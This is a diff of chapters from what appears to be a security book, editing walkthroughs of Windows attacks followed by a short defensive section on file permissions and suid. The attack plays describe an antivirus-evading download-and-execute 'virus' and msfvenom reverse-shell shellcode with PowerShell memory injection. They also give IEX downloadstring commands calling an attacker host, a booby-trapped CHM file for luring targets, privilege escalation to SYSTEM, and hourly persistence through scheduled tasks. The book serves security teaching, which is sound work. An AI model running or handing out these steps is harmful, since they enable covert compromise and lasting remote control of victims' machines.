-G> Now let us create our binary virus, we will write this in c. I am going to call this `download-payload-execute.c` because that is what it does. Obviously you would want to call it something that your target felt comfortable running. This is what it looks like:
+G> Now let's create our binary virus, we will write this in c. I am going to call this `download-payload-execute.c` because that is exactly what it does. Obviously you would want to call it something that your target felt comfortable running. This is what it looks like:
 
 {id="download-psmsf-payload-execute", title="download-payload-execute", linenos=off, lang=c}
     #include<stdio.h>
@@ -345,13 +344,13 @@ G> Now let us create our binary virus, we will write this in c. I am going to ca
     }
 
 {icon=bomb}
-G> With this, neither the payload or the virus should trigger Anti-Virus.
+G> Neither the payload or the virus should trigger Anti-Virus.
 G>
-G> Now you will need a c compiler on a system of the same architecture as your target. I set-up MinGW in the Tooling Setup chapter under Windows, so you should be good to compile the virus.
+G> You will need a C compiler on a system of the same architecture as your target. I set-up MinGW in the Tooling Setup chapter under Windows, if you followed along you should be able to compile the virus.
 G>
 G> `gcc download-payload-execute.c -o download-payload-execute.exe`
 G>
-G> This should provide you with an executable that AV will be happy about. You just need to convince your target to run it. When they do, your listener will catch the reverse_tcp shell.
+G> This should provide you with an executable that AV will not detect. You just need to convince your target to run it. When they do, your listener will catch the reverse_tcp shell.
 G>
 G> Target runs virus. Attacker sees:
 G>
@@ -360,7 +359,7 @@ G> `[*] Sending encoded stage (958029 bytes) to <target-ip>`
 G> `[*] Meterpreter session 6 opened (<listener-attack-ip>:4444 -> <target-ip>:63814) at 2016-12-28 15:31:29 +1300`  
 G> `msf exploit(handler) >`
 G>
-G> Now we have our shell. Type `sessions` to see its details:
+G> We now have a shell. Type `sessions` to see its details:
 G>
 G> `msf exploit(handler) > sessions`
 G>
@@ -403,8 +402,8 @@ G> `sniffer`
 G> `stdapi`  
 G> `winpmem`
 G>
-G> If `priv` was not in the list, try load it with `use priv`.  
-G> Let us try for system, if this is not successful, try running `run bypassuac` first:
+G> If `priv` was not in the list, try to load it with `use priv`.  
+G> Try for system privileges, if this is not successful, try running `run bypassuac` first:
 G>
 G> `meterpreter > getsystem -h`  
 G> `Usage: getsystem [options]`
@@ -427,7 +426,7 @@ G> `meterpreter > getuid`
 G> `Server username: NT AUTHORITY\SYSTEM`
 G>
 G> No issue with Anti-Virus at all.  
-G> That is the easy part done, now you would need to setup persistence, and start moving laterally through the network.
+G> With the easy part done, your next step is to setup persistence, and start moving laterally through the network.
 
 {icon=bomb}
 G> `meterpreter > exit`  
@@ -458,20 +457,20 @@ G> `ss -ant` Will confirm that we are not listening on `4444` any more.
 
 ##### PowerShell Payload creation details {#vps-identify-risks-powershell-exploitation-via-executable-psmsf-powershell-payload-creation-details}
 
-When `psmsf` is run as per above, the Metasploit `windows/meterpreter/reverse_tcp` shellcode is generated by running `msfvenom` programmatically as the following:  
+When `psmsf` is run as per above, the Metasploit `windows/meterpreter/reverse_tcp` shellcode is generated by running `msfvenom` programmatically as follows:  
 
 {linenos=off, lang=bash}
     msfvenom --payload windows/meterpreter/reverse_tcp LHOST=<listener-ip> LPORT=4444 StagerURILength=5 StagerVerifySSLCert=false --encoder x86/shikata_ga_nai --arch x86 --platform windows --smallest --format c
     # msfvenom --help-formats # Lists all the formats available with description.
     # msfvenom --list encoders # Lists all the encoders available with description.
 
-`psmsf` then takes the generated output and in a function called [`extract_msf_shellcode`](https://github.com/nixawk/psmsf/blob/2e599d5a757ea1540794b46a25825e5317b66fc6/psmsf#L47) strips out the characters that do not actually form part of the raw shellcode, like an assignment to a char array, double quotes, new lines, semicolons, white space, etc, and just leaves the raw shellcode.
+`psmsf` then takes the generated output and in a function called [`extract_msf_shellcode`](https://github.com/nixawk/psmsf/blob/2e599d5a757ea1540794b46a25825e5317b66fc6/psmsf#L47) strips out the characters that do not actually form part of the raw shellcode, such as an assignment to a char array, double quotes, new lines, semicolons, white space, etc, and just leaves the raw shellcode.
 
 `psmsf` then replaces any instances of `\x` with `0x`.
 
 `psmsf` then passes the cleaned up `reverse_tcp` shellcode to a function called [`generate_powershell_script`](https://github.com/nixawk/psmsf/blob/2e599d5a757ea1540794b46a25825e5317b66fc6/psmsf#L83-L103) that embeds it into a PowerShell script that is going to become the main part of our payload.
 
-That code looks like the following, I have added the annotations to help you understand how it works:
+That code appears as follows, I have added the annotations to help you understand how it works:
 
 
 {title="psmsf", linenos=off, lang=python}
@@ -514,7 +513,7 @@ That code looks like the following, I have added the annotations to help you und
         # https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887(v=vs.85).aspx
         # & set execute, read-only, or read/write access (0x40) to the committed region of pages.
         # https://msdn.microsoft.com/en-us/library/windows/desktop/aa366786(v=vs.85).aspx
-        # Essentially just allocate some (all permissions) memory at the start of PowerShell
+        # Essentially, just allocate some (all permissions) memory at the start of PowerShell
         #   that is executing this & assign the base address of the allocated memory to $x.
     
         "$x=$w::VirtualAlloc(0,0x1000,$g,0x40);"
@@ -548,9 +547,9 @@ That code looks like the following, I have added the annotations to help you und
     
       return shellcode
 
-is psmsf [licensed](https://github.com/nixawk/psmsf/blob/master/License.txt) with BSD License.
+psmsf is [licensed](https://github.com/nixawk/psmsf/blob/master/License.txt) with BSD License.
 
-The `powershell_hacking.bat` that we copy to our web hosting directory as `payload.txt`, is the result of the content referenced by the above returned reference to the shellcode variable after it has been `utf_16_le` encoded then base 64 encoded. This occurs in the [`generate_powershell_command`](https://github.com/nixawk/psmsf/blob/2e599d5a757ea1540794b46a25825e5317b66fc6/psmsf#L108) as follows:
+The `powershell_hacking.bat` file that we copy to our web hosting directory as `payload.txt` is the result of the content referenced above returned to the shellcode variable after it has been `utf_16_le` encoded, then base 64 encoded. This occurs in the [`generate_powershell_command`](https://github.com/nixawk/psmsf/blob/2e599d5a757ea1540794b46a25825e5317b66fc6/psmsf#L108) as follows:
 
 {id="powershell_hacking-bat", linenos=off, lang=python}
     # Gives us powershell_hacking.bat
@@ -559,7 +558,7 @@ The `powershell_hacking.bat` that we copy to our web hosting directory as `paylo
 
 #### PowerShell Exploitation Evolution {#vps-identify-risks-powershell-exploitation-evolution}
 
-After working with PowerShell exploitation for a few weeks, what quickly becomes apparent is how powerful, easy and effective exploitation and post-exploitation is with the PowerShell medium. There are many tools and modules available to use, often some will not quite work, then you will find a similar variant that someone has taken and improved that does the job adequately. For example, the attack I just demonstrated was based on the Trustedsec [unicorn.py](https://github.com/trustedsec/unicorn/blob/6f245ebe0c4ab465f15edea12767604120dd0276/unicorn.py#L362-L363) which did not quite work for me. Then upstream of unicorn is [Invoke-Shellcode.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1) of the PowerShellMafia PowerSploit project, which looks to be in good shape. Matt Graeber's technique of injecting a given shellcode into the running instance of PowerShell is the common theme running through the PowerShell shellcode injection exploits used in a number of projects. Matt [blog posted](http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html) on this technique in 2011 which is very similar to what we just used above with Psmsf. The landscape is very fluid, but there are always options and usually without requiring any code modifications.
+After working with PowerShell exploitation for a few weeks, what quickly becomes apparent is how powerful, easy and effective exploitation and post-exploitation is with the PowerShell medium. There are many tools and modules available to use. Often some will not quite work, then you will find a similar variant that someone has taken and improved that does the job adequately. For example, the attack I just demonstrated was based on Trustedsec's [unicorn.py](https://github.com/trustedsec/unicorn/blob/6f245ebe0c4ab465f15edea12767604120dd0276/unicorn.py#L362-L363), which did not quite work for me. Upstream of unicorn is [Invoke-Shellcode.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1) from the PowerShellMafia PowerSploit project, which is well supported and maintained. Matt Graeber's technique for injecting a given shellcode into the running instance of PowerShell is the common theme running through the PowerShell shellcode injection exploits used in a number of projects. Matt [blog posted](http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html) on this technique in 2011 which is very similar to what we just used above with Psmsf. The landscape is very fluid, but there are always options, and they usually don't require any code modifications.
 
 The Veil-Framework's Veil-Evasion has a similar [set of payloads](https://github.com/Veil-Framework/Veil-Evasion/tree/master/modules/payloads/powershell) that @harmj0y [blog posted](https://www.veil-framework.com/powershell-payloads/) on. Kevin Dick also wrote a decent [blog post](http://threat.tevora.com/dissecting-veil-evasion-powershell-payloads-and-converting-to-a-bind-shell/) on these.
 
@@ -571,15 +570,15 @@ When I tested the payload generated by version 7.4.3 of `setoolkit`:
 #### PowerShell Exploitation via Office Documents C/- [Nishang](https://github.com/samratashok/nishang) {#vps-identify-risks-powershell-exploitation-via-office-documents-co-nishang}
 ![](images/ThreatTags/average-common-difficult-severe.png)
 
-Running an executable or convincing your target to run it works in many cases, but other options like office documents can work well also. Nishang is a framework and collection of scripts and payloads that empower us to use PowerShell for all phases of penetration testing. Amongst the many goodies in Nishang is a collection of scripts which can [create office documents](https://github.com/samratashok/nishang/tree/1b5aca1a1eb170befccf1d111e8902285d553289/Client) such as Word, Excel, CHM and a handful of others.
+Running an executable, or convincing your target to run it works in many cases, but other options such as Office documents can work well also. Nishang is a framework and collection of scripts and payloads that empower us to use PowerShell for all phases of penetration testing. Amongst the many goodies in Nishang is a collection of scripts which can [create Office documents](https://github.com/samratashok/nishang/tree/1b5aca1a1eb170befccf1d111e8902285d553289/Client) such as Word, Excel, CHM and a handful of others.
 
 ![](images/HandsOnHack.png)
 
 I> ## Synopsis
 I>
-I> This play is identical in all areas to the last one, except that we swap the `download-payload-execute.exe` for a chm virus (`doc.chm`) that does the same thing (download and invoke the payload file content). We will use the [`Out-CHM`](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1) `nishang` script to create the `doc.chm` file that downloads and invokes the same `powershell_hacking.bat` that we hosted as `http://<listener-attack-ip>/payload.txt`, which as discussed in the [PowerShell Payload creation details](#vps-identify-risks-powershell-exploitation-via-executable-psmsf-powershell-payload-creation-details) above, overwrites the first 0x1000 bytes of the calling instance of PowerShell with the reverse shell that `msvenom` provided to `psmsf` and then creates a thread in the virtual address space of the calling PowerShell instance and declares that it should be run immediately.
+I> This play is identical in all areas to the last one, except that we swap the `download-payload-execute.exe` for a chm virus (`doc.chm`) that does the same thing (download and invoke the payload file content). We will use the [`Out-CHM`](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1) `nishang` script to create the `doc.chm` file that downloads and invokes the same `powershell_hacking.bat` that we hosted as `http://<listener-attack-ip>/payload.txt`. This,  as discussed in the [PowerShell Payload creation details](#vps-identify-risks-powershell-exploitation-via-executable-psmsf-powershell-payload-creation-details) above, overwrites the first 0x1000 bytes of the calling instance of PowerShell with the reverse shell that `msvenom` provided to `psmsf`. It then creates a thread in the virtual address space of the calling PowerShell instance and declares that it should be run immediately.
 I>
-I> The `doc.chm` or what ever you decide to call it, can be emailed, put on a USB stick, or DVD, and given to your trusting target, or simply leave a few suitably labelled copies lying in a place that will take advantage of our targets curiosity.
+I> The `doc.chm`, or what ever you decide to call it, can be emailed, put on a USB stick, or DVD, and given to your trusting target, or simply leave a few suitably labelled copies lying in a place that will take advantage of our target's curiosity.
 
 I have not provided a video with this play as it is very similar to the previous one.
 
@@ -601,32 +600,32 @@ G> `Import-Module .\Out-CHM.ps1`
     IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/payload.txt '))
 
 {icon=bomb}
-G> This does not get persisted, but we use the same file below in [Adding Persistence C/- PowerSploit](#vps-identify-risks-adding-persistence-co-powersploit) where the contents is persisted.
+G> This is not persisted, but we use the same file below in [Adding Persistence C/- PowerSploit](#vps-identify-risks-adding-persistence-co-powersploit) where the contents is persisted.
 G>
-G> Now you should see a `doc.chm` created in the folder that you ran the above command from.
+G> You should see a `doc.chm` created in the folder that you ran the above command from.
 G>
-G> Now you need to get the `doc.chm` onto your targets machine or a network share that your target can access/copy from, and persuade your target to run the `doc.chm`. When they do, the results will be the same as we saw in the [Powershell Exploitation with Psmsf](#powershell-exploitation-with-psmsf-play) play from above from where the target runs the virus.
+G> Next, you need to get the `doc.chm` onto your target's machine, or a network share that your target can access/copy from, and persuade your target to run the `doc.chm`. When they do, the results will be the same as we saw in the [Powershell Exploitation with Psmsf](#powershell-exploitation-with-psmsf-play) play from above from where the target runs the virus.
 
 #### Adding Persistence C/- Meterpreter {#vps-identify-risks-adding-persistence-co-meterpreter}
 
-Metasploit had a Meterpreter script called [`persistence.rb`](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/) that could create a persistent (survive reboots, and most other actions a user will take) reverse shell, these scripts are no longer supported. If you try to use it, you will probably get an error like: "`windows version of Meterpreter is not supported with this Script`"
+Metasploit had a Meterpreter script called [`persistence.rb`](https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/) that could create a persistent (survive reboots, and most other actions a user will take) reverse shell, but these scripts are no longer supported. If you try to use it, you will probably receive an error such as: "`windows version of Meterpreter is not supported with this Script`"
 
-Now the [`exploit/windows/local/persistence`](https://github.com/rapid7/metasploit-framework/issues/6904) module is recommended for persistence. AV picks this up on reboot though, so you probably will not get far with this. 
+At present, the [`exploit/windows/local/persistence`](https://github.com/rapid7/metasploit-framework/issues/6904) module is recommended for persistence. AV picks this up on reboot though, so you probably will not get very far with this persistence mechanism. 
 
 #### Adding Persistence C/- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/) {#vps-identify-risks-adding-persistence-co-powersploit}
 
-We can do better than `meterpreter`. PowerSploit has a module called [Persistence](https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1), and that is what we use in this play. This adds persistence to the PowerShell one liner that was embedded in the `psmsf` virus we created above, namely [`download-payload-execute`](#download-psmsf-payload-execute), and also used in the office document [attack with `nishang`](#powershell-exploitation-via-office-documents). The one liner was:
+We can do better than `meterpreter`. PowerSploit has a module called [Persistence](https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1), which we'll use in this play. This adds persistence to the PowerShell one-liner that was embedded in the `psmsf` virus we created above, namely [`download-payload-execute`](#download-psmsf-payload-execute), and also used in the Office document [attack with `nishang`](#powershell-exploitation-via-office-documents). The one-liner was:
 
 {title="persistentFetchRunPayload.ps1", linenos=off, id="persistentFetchRunPayload-ps1", lang=PowerShell}
     IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/payload.txt '))
 
-I had a play with the `nishang` [`Add-Persistence.ps1`](https://github.com/samratashok/nishang/blob/1b5aca1a1eb170befccf1d111e8902285d553289/Utility/Add-Persistence.ps1) script, which may be useful for creating post-exploitation persistence, but I was looking for a solution to create an atomic persistent exploit, which is what PowerSploit provides.
+I had a play with the `nishang` [`Add-Persistence.ps1`](https://github.com/samratashok/nishang/blob/1b5aca1a1eb170befccf1d111e8902285d553289/Utility/Add-Persistence.ps1) script, which may be useful for creating post-exploitation persistence, but I was looking for a solution to create an atomic persistent exploit, which is provided by PowerSploit.
 
 ![](images/HandsOnHack.png)
 
 I> ## Synopsis
 I>
-I> In this play we extend the [PowerShell Exploitation via Office Documents](#powershell-exploitation-via-office-documents) play with the help from PowerSploit. The play below should explain everything.
+I> In this play we extend the [PowerShell Exploitation via Office Documents](#powershell-exploitation-via-office-documents) play with help from PowerSploit. 
 
 ![](images/PersistentPowerShell.png)
 
@@ -651,7 +650,7 @@ G> `PS C:\Source\PowerSploit\Persistence>$ElevatedOptions = New-ElevatedPersiste
 G> In case target runs virus with standard privileges, you need to run:  
 G> `PS C:\Source\PowerSploit\Persistence>$UserOptions = New-UserPersistenceOption -ScheduledTask -Hourly`
 G>
-G> This next command is responsible for creating the script ([`Persistence.ps1`](#Persistence-ps1)), and its encoded form ([`EncodedPersistentScript.ps1`](#EncodedPersistentScript-ps1)), that when downloaded from the attackers hosting location and invoked atomically by the `doc.chm` that `nishang` creates for us below, persists the contents of [`persistentFetchRunPayload.ps1`](#persistentFetchRunPayload-ps1) in its encoded form into the targets PowerShell profile. If the target is running as administrator when they open the `doc.chm`, the contents of the `persistentFetchRunPayload.ps1` in its encoded form will be written to `%windir%\system32\Windows­PowerShell\v1.0\profile.ps1`, and an hourly scheduled task set to run `PowerShell.exe` as `System`. If the target is running as a low privileged user when they open the `doc.chm`, the contents of the `persistentFetchRunPayload.ps1` in its encoded form will be written to `%UserProfile%\Documents\Windows­PowerShell\profile.ps1`, and an hourly scheduled task set to run `PowerShell.exe` as the user. When `PowerShell.exe` runs, it implicitly runs what ever is in your `profile.ps1`  
+G> This next command creates the script ([`Persistence.ps1`](#Persistence-ps1)), and its encoded form ([`EncodedPersistentScript.ps1`](#EncodedPersistentScript-ps1)) that, when downloaded from the attacker's hosting location and invoked atomically by the `doc.chm` created by `nishang` below, persists the contents of [`persistentFetchRunPayload.ps1`](#persistentFetchRunPayload-ps1) in its encoded form into the target's PowerShell profile. If the target is running as administrator when they open `doc.chm`, the contents of the `persistentFetchRunPayload.ps1` in its encoded form will be written to `%windir%\system32\Windows­PowerShell\v1.0\profile.ps1`, and an hourly scheduled task set to run `PowerShell.exe` as `System` will be created. If the target is running as a low privileged user when they open `doc.chm`, the contents of the `persistentFetchRunPayload.ps1` in its encoded form will be written to `%UserProfile%\Documents\Windows­PowerShell\profile.ps1`, and an hourly scheduled task will be set to run `PowerShell.exe` as the user. When `PowerShell.exe` runs, it implicitly runs what ever is in your `profile.ps1`  
 G> `PS C:\Source\PowerSploit\Persistence>Add-Persistence -FilePath C:\Users\kim\Desktop\persistentFetchRunPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose -PassThru | Out-EncodedCommand | Out-File .\EncodedPersistentScript.ps1`
 G>
 G> Just as in the [PowerShell Exploitation via Office Documents](#vps-identify-risks-powershell-exploitation-via-office-documents-co-nishang) above, the `persistentFetchRunPayload.ps1` is used.  
@@ -690,15 +689,15 @@ G> 1. Listen for the reverse shell
 G> 2. Host `powershell_hacking.bat` as `/var/www/html/payload.txt`  
 G> As in the previous plays, Start your web server if it is not still running:  
 G> `Service apache2 start`  
-G> I tried downloading and `I`nvoking `EX`pression from ISE using both:
+G> I tried downloading and `I`nvoking `EX`pression from ISE using both
 
 {linenos=off, lang=PowerShell}
     IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/Persistence.ps1 '))
-    # and:  
+    # and  
     IEX ((new-object net.webclient).downloadstring('http://<listener-attack-ip>/EncodedPersistentScript.ps1 '))
 
 {icon=bomb}
-G> before doing the same by running the `doc.chm` we create below. Both `Persistence.ps1` and `EncodedPersistentScript.ps1` gave me problems initially. It turned out that the actual file encoding of both files was not right. If you just copy either of the files from your Windows attack VM to your hosting directory on your Kali Linux VM, you may have the same issue. I ended up creating a new file in the hosting location and copy->pasting the file contents into the new file, and that worked. the first part of the error from `IEX` in ISE for `Persistence.ps1` was:
+G> before doing the same thing when running the `doc.chm` we create below. Both `Persistence.ps1` and `EncodedPersistentScript.ps1` gave me problems initially. It turned out that the actual file encoding of both files was not right. If you just copy either of the files from your Windows attack VM to your hosting directory on your Kali Linux VM, you may have the same issue. I ended up creating a new file in the hosting location and copy->pasting the file contents into the new file, which worked successfully. The first part of the error from `IEX` in ISE for `Persistence.ps1` was:
 G>
 G> `The term 'ÿþf u n c t i o n ' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. At line:1 char:19`
 G>
@@ -706,18 +705,18 @@ G> For `EncodedPersistentScript.ps1` it was:
 G>
 G> `The term 'ÿþp o w e r s h e l l ' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again. At line:1 char:23`
 G>
-G> See the funny characters? That is what gave it away.
+G> See the funny characters? That's what gave it away.
 G>
-G> Now we can create our `doc.chm` or what ever you want to call it, informing `Out-CHM` that we want the payload of `doc.chm` to be the script ([`EncodedPersistentScript.ps1`](#EncodedPersistentScript-ps1)) we just created and hosted, that when downloaded and invoked, will persist the contents of [`persistentFetchRunPayload.ps1`](#persistentFetchRunPayload-ps1) in its encoded form to the PowerShell profile that belongs to the user that opened `doc.chm`. Run the following commands to create the `doc.chm`:  
+G> We now create `doc.chm`, or what ever you want to call it, informing `Out-CHM` that we want the payload of `doc.chm` to be the script ([`EncodedPersistentScript.ps1`](#EncodedPersistentScript-ps1)) we just created and hosted. When downloaded and invoked, it will persist the contents of [`persistentFetchRunPayload.ps1`](#persistentFetchRunPayload-ps1) in its encoded form to the PowerShell profile that belongs to the user who opened `doc.chm`. Run the following commands to create `doc.chm`:  
 G> `PS C:\Source\nishang\Client> Import-Module .\Out-CHM.ps1`  
 G> `PS C:\Source\nishang\Client>Out-CHM -PayloadURL http://<listener-attack-ip>/EncodedPersistentScript.ps1 –HHCPath “C:\Program Files (x86)\HTML Help Workshop”`
 G>
-G> Now it is time to setup our listening Metasploit ready to catch the reverse shell when our target runs the `doc.chm`. We use the same `powershell_msf.rc` resource file that `psmsf` created for us in the [PowerShell Exploitation with Psmsf](#powershell-exploitation-with-psmsf-play) play above.  
+G> Next, we setup our Metasploit listener, ready to catch the reverse shell when our target runs  `doc.chm`. We use the same `powershell_msf.rc` resource file that `psmsf` created for us in the [PowerShell Exploitation with Psmsf](#powershell-exploitation-with-psmsf-play) play above.  
 G> Start your listener using the `powershell_msf.rc` resource rile:  
 G> `msfconsole -r powershell_msf.rc`
 
 {icon=bomb}
-G> Now you need to get the `doc.chm` onto your targets machine or a network share that your target can access/copy from, and persuade your target to run the `doc.chm`. When they do, as discussed above, `EncodedPersistentScript.ps1` will be downloaded and invoked, which will write the embedded encoded contents of `persistentFetchRunPayload.ps1` to the PowerShell profile, and setup a scheduled task. When the task fires, as in the previous attacks, the `payload.txt` will be downloaded and its expression invoked, which will cause the reverse shell to be executed. The listening Metasploit will catch the shell. If you have the scheduled task configured to run every hour, then you will get a reverse shell every hour. This survives reboots and most other actions any user will take, other than removing the PowerShell profile contents we created or removing the scheduled task.
+G> The `doc.chm` file must be delivered to your target's machine or a network share that your target can access/copy from, and your target must be persuaded to run it. When they do, as discussed above, `EncodedPersistentScript.ps1` will be downloaded and invoked, which will write the embedded encoded contents of `persistentFetchRunPayload.ps1` to the PowerShell profile, and setup a scheduled task. When the task fires, as in the previous attacks, the `payload.txt` will be downloaded, and its expression invoked, which causes the reverse shell to be executed. The Metasploit listener will catch the shell. If you have the scheduled task configured to run every hour, then you will get a reverse shell every hour. This survives reboots and most other actions any user will take, other than removing the PowerShell profile contents we created, or removing the scheduled task.
 
 The PowerSploit Persistence module offers the following persistence techniques:
 
@@ -737,31 +736,31 @@ At the following stages:
 I> Be aware if you want to use the `OnIdle` parameter, that the Windows Task Scheduler service only checks every 15 minutes to see if the computer is in an idle state. The computer is considered to be [idle if](https://social.technet.microsoft.com/Forums/windows/en-US/692783e7-bb73-45d1-95d6-8f2d1363d6c7/cant-get-task-schedular-to-run-a-batch-on-idle?forum=w7itprogeneral):
 I>
 I> 1) A screen saver is running, or  
-I> 2) if no screen saver is running, the CPU is at 0% usage, and there is 0% disk I/O for 90% of the past fifteen minutes, and if there has been no keyboard or mouse input for that period of time.
+I> 2) no screen saver is running, the CPU is at 0% usage, and there is 0% disk I/O for 90% of the past fifteen minutes, and if there has been no keyboard or mouse input for that period of time.
 
 T> The easiest way to kill many instances of `powershell` when you are experimenting is to run the following command:  
 T> `taskkill /F /IM powershell.exe /T`
 
-There are many ways to achieve persistence. I have not included any lateral movement or privilege escalation amongst these PowerShell plays, but feel free to take your post exploitation further. Even the tools we have used in these plays have a good variety of both.
+There are many ways to achieve persistence. I have not included any lateral movement or privilege escalation amongst these PowerShell plays, but feel free to take your post-exploitation further. The tools we have used in these plays include a good variety of both lateral movement and privilege escalation options.
 
 ### Unnecessary and Vulnerable Services 
 
 #### Overly Permissive File Permissions, Ownership and Lack of Segmentation {#vps-identify-risks-unnecessary-and-vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation}
 ![](images/ThreatTags/average-uncommon-difficult-moderate.png)
 
-A lack of segmenting of a file system, according to what is the least amount of privilege any authorised parties require is often the precursor to **privilege escalation**.
+Failure to segment a file system or services, according to least privilege principles, is often the precursor to **privilege escalation**.
 
-Privileged services that are started on system boot by your init system (as discussed under the [Proactive Monitoring](#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit) section) often run other executable files whether they be binaries or scripts.
+Privileged services that are started on system boot by your init system (as discussed under the [Proactive Monitoring](#vps-countermeasures-lack-of-visibility-proactive-monitoring-sysvinit-upstart-systemd-runit) section) often run other executable files, whether they be binaries or scripts.
 
-When an executable (usually run as a daemon) is called by one of these privileged services and is itself writeable by a low privileged user, then a malicious actor can swap the legitimate executable for a trojanised replica, or even just a malicious executable if they think it will go unnoticed.
+When an executable (usually run as a daemon) is called by one of these privileged services, and is itself writeable by a low privileged user, then a malicious actor can swap the legitimate executable for a trojanised replica, or even just a malicious executable they think will go unnoticed.
 
-If we take the path of least resistance when setting up our partitions on installation by combining file system resources that have lesser requirements for higher privileges, together with those that have greater requirements, then we are not applying the principle of least privilege. What this means is that some resources that do not need the extra privileges in order to do their job, get given them anyway. This allows attackers to take advantage of this, by swapping in (writing) and executing malicious files, directly or indirectly.
+It doesn't pay to take the path of least resistance when setting up our VPS partitions during installation. Combining file system resources with lesser requirements for higher privileges, with those that have greater requirements, contradicts the principle of least privilege. Simply, some resources that don't need extra privileges to do their job, are granted them regardless. This allows attackers to exploit the opportunity, by swapping in (writing) and executing malicious files, directly or indirectly.
 
-If the target file that an attacker wants to swap for a trojanised version is world writeable, user writeable or even group writeable, and they are that user or in the specified group, then they will be able to swap the file... Unless the mounted file system is restrictive enough to mitigate the action.
+If a target file of interest to an attacker is world writeable, user writeable, or even group writeable,  then the attacker will be able to swap or trojanize the file. Only if the mounted file system is restrictive will the action be mitigated.
 
 {#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation-mitigations}
 1. The first risk is at the file permission and ownership level
-    1. The first tool we can pull out of the bag is [unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check), which has its source code on [github](https://github.com/pentestmonkey/unix-privesc-check) and is also shipped with Kali Linux, but only the 1.x version (`unix-privesc-check` single file), which is fine, but the later version which sits on the master branch (`upc.sh` main file plus many sub files) does a lot more, so it can be good to use both. You just need to get the shell file(s) from either the `1_x` or `master` branch onto your target machine and run. Running as root allows the testing to be a lot more thorough for obvious reasons. If I'm testing my own host, I will start with the `upc.sh`, I like to test as a non root user first, as that is the most realistic in terms of how an attacker would use it. Simply looking at the main file will give you a good idea of the options, or you can just run:  
+    1. The first tool to pull out of the bag is [unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check), which is source hosted on [github](https://github.com/pentestmonkey/unix-privesc-check) and is was shipped with Kali Linux, but only Kali 1.x (`unix-privesc-check` single file). The later version which resides on the master branch (`upc.sh` main file plus many sub files) does a lot more, so consider using both. You just need to pull the shell file(s) from either the `1_x` or `master` branch to your target system and run. Run it as root to allow the testing to be a lot more thorough, for obvious reasons. If I'm testing my own host, I will start with `upc.sh`. I like to test as a non root user first, as that is the most realistic in terms of how an attacker would use it. Simply reading the main file will give you a good idea of the options, or you can just run:  
     `./upc.sh -h`  
         
         
@@ -772,13 +771,13 @@ If the target file that an attacker wants to swap for a trojanised version is wo
         
     2. [LinEnum](https://github.com/rebootuser/LinEnum) is also very good at host reconnaissance, providing a lot of potentially good information on files that can be trojanised.  
     Also check the [Additional Resources](#additional-resources-vps-identify-risks-unnecessary-and-vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation) chapter for other similar tools for both Linux and Windows.
-2. The second risk is at the mount point of the file system. This is quite easy to test and it also takes precedence over file permissions, as the mount options apply to the entire mounted file system. This is why applying as restrictive as possible permissions to granular file system partitioning is so effective.
+2. The second risk is at the mount point of the file system. This is quite easy to test and it also takes precedence over file permissions, as the mount options apply to the entire mounted file system. This is why applying the most restrictive permissions to granular file system partitioning is so effective.
     1. The first and easiest command to run is:  
     `mount`  
-    This will show you the options that all of your file systems were mounted with. In the Countermeasures we address how to improve the permissiveness of these mounted file systems.
-    2. For peace of mind, I usually like to test that the options that our file systems appear to be mounted with actually are. You can make sure by trying to write an executable file to the file systems that have `noexec` as specified in `/etc/fstab` and attempt to run it, it should fail.
+    This will show you the options that all of your file systems were mounted with. In Countermeasures we address how to improve the permissiveness of these mounted file systems.
+    2. For peace of mind, I usually like to ensure that the options that our file systems appear to be mounted, are the actuall permissions. You can make sure by trying to write an executable file to the file systems that have `noexec` as specified in `/etc/fstab`. When you attempt to run it, it should fail.
     3. You can try writing any file to the file systems that have the `ro` (read-only) option specified against them in the `/etc/fstab`, that should also fail.
-    4. Applying the `nosuid` option to your mounts prevents the `suid` (**S**et owner **U**ser **ID**) bit on executables from being respected. If for example we have an executable that has its `suid` bit set, any other logged in user temporarily inherits the file owners permissions as well as the UID and GID to run that file, rather than their own permissions.
+    4. Applying the `nosuid` option to your mounts prevents the `suid` (**S**et owner **U**ser **ID**) bit on executables from being honored. As an example, an executable may have its `suid` bit set, but any other logged in user temporarily inherits the file owner's permissions, as well as the UID and GID to run that file, rather than their own permissions.
 
 Running a directory listing that has a file with its `suid` bit set will produce a permission string similar to `-rwsr--r--`  
 The `s` is in the place of the owners executable bit. If instead a capitol `S` is used, it means that the file is not executable
@@ -789,7 +788,7 @@ All `suid` files can be found with the following command:
 All `suid` files owned by root can be found with the following command:  
 `find / -uid 0 -perm -4000 -type f 2>/dev/null`
 
-To add the `suid` bit, you can do so the symbolic way or numeric.
+To add the `suid` bit, you can do so symbolically or numerically.
 
 symbolic:  
 `chmod u+s <yourfile>`
@@ -797,23 +796,23 @@ symbolic:
 numeric:  
 `chmod 4750 <yourfile>`
 
